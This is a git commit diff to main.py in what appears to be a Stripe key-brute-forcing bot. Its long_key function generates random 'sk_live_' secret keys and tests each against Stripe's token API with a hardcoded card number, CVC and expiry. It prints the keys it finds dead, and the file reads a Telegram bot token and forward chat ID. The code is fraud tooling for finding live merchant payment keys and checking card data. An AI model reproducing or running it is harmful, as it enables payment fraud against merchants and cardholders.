e6a105ae27b02d81bbc0fc49dd6832e39dd16000
namynam63 <104711080+namynam63@users.noreply.github.com>
2023-07-11 00:23:48 +0530

    Update main.py

--- main.py
+++ main.py
@@ -4,7 +4,7 @@ token = os.environ.get("BOT_TOKEN", "6079859368:AAFkZ2B6rQlzLecDJN5SbIcEF5RTtd4-
 chatid = os.environ.get("FORWARD_ID","5687234987")
 
 def long_key():
-  skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
+  skkey = random.choice([' sk_live_u9RfdHQRtxtlFIiXWCLs1Hqw', ' sk_live_u9RfdHQRtxtlFIiXWCLs1Hqw'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
   pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
   if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
     print(f"DEAD > {skkey}")
